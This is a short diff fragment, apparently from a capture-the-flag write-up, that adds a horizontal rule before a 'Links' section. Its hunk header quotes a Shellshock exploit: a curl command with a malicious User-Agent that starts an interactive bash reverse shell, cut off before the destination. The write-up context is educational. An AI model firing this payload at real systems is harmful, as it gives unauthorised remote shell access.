@@ -259,6 +259,7 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/819decc1-3fb6-4d95-8915-6df5306f1a9f)
 
+---
 
 # Links
 
